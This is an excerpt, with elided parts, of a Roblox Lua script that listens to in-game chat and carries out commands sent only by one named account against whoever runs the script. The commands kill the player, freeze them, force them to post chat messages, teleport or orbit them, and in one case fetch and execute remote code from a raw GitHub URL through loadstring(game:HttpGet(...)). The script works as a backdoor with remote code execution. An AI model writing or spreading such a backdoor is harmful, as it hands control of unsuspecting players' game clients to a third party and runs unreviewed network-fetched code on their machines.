...
TextChatService.OnIncomingMessage = function(message)
    pcall(function()
        ...
        if messageContent == "/kill" and player == "Dkailhan_1" then
            lp.Character.Humanoid.Health = 0
        elseif messageContent == "/bring" and player == "Dkailhan_1" then
        ...
        elseif messageContent == "/fr" and player == "Dkailhan_1" then
            lp.Character.HumanoidRootPart.Anchored = true
        elseif messageContent == "/unfr" and player == "Dkailhan_1" then
            lp.Character.HumanoidRootPart.Anchored = false
        elseif string.sub(messageContent, 1, 4) == "/say" and player == "Dkailhan_1" then
            local toSay = string.sub(message, 6)
            SayMessageRequest:FireServer(toSay, "All")
        elseif string.sub(messageContent, 1, 5) == "/spin" and player == "Dkailhan_1" then
        ...
        elseif messageContent == "/resetscript" and player == "Dkailhan_1" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
        elseif string.sub(messageContent, 1, 6) == "/orbit" and player == "Dkailhan_1" then
            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
        ...
        elseif messageContent == "/unorbit" and player == "Dkailhan_1" then
            if orbiting then
                orbiting = false
